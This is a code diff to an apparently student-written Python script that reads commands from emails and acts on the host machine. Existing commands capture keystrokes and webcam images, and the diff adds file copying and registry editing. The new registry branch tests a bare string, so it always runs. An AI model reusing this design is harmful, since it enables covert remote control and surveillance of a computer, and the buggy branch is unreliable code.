@@ -9,6 +9,8 @@ from reply_process import reply_list_running_app, reply_stop_app
 #from reply_shutdown_restart import reply_shutdown, reply_restart
 from reply_pressed_key import reply_pressed_key
 from reply_camera_capture import reply_camera_capture
+from reply_copy_file import reply_copy_file
+from reply_registry import reply_modify_reg
 
 USERNAME = 'networkingass20120015@gmail.com'
 PASSWORD = 'DummyPassword123'
@@ -65,6 +67,20 @@ if __name__ == '__main__':
                         reply_pressed_key(email_message, USERNAME, PASSWORD)
                     elif 'camera' in body_message:
                         reply_camera_capture(email_message, USERNAME, PASSWORD)
+                    elif 'copy' in body_message:
+                        # Kinda lazy let just do this for now
+                        ls = body_message.split()
+                        pos = ls.index('copy')
+                        
+                        if pos + 2 < len(ls):
+                            reply_copy_file(email_message, USERNAME, PASSWORD, ls[pos + 1], ls[pos + 2])
+                    elif 'reg':
+                        ls = body_message.split()
+                        pos = ls.index('reg')
+                        
+                        if pos + 3 < len(ls):
+                            reply_modify_reg(email_message, USERNAME, PASSWORD, ls[pos + 1], ls[pos + 2], ls[pos + 3])
+                        
                         
                     retcode, data = conn.store(num, '+FLAGS', '(\\Seen)')
             
